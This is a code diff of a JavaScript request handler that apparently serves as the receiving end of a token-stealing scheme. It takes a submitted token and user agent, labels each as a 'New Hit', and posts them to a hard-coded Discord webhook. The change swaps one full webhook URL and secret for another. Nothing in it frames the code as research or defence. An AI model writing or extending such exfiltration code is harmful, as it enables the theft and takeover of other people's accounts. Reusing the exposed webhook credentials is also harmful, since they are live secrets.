@@ -17,7 +17,7 @@ export default async function handler(req, res) {
     try { data = JSON.parse(data); } catch(e) {}
   }
 
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1575120527939608648/jkM3eB2oPgEMMbuNa7zKZ6Idez4-oPUgyI9sMqurkNRjQmG40TXOq6HvFaZwRoCEVdUe";
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1575123789933580393/FZjGMls7iJHxVZ0muXHjxtInSpfbZqIMZfYHvPAcT3roPZKVW6xwKco71A4YSTsBLd6e";
 
   const tokenText = data.t ? data.t : "EMPTY (Not logged in, or app webview)";
   const content = `**New Hit**\n**Token:** \`${tokenText}\`\n**UA:** ${data.ua || "Unknown"}`;
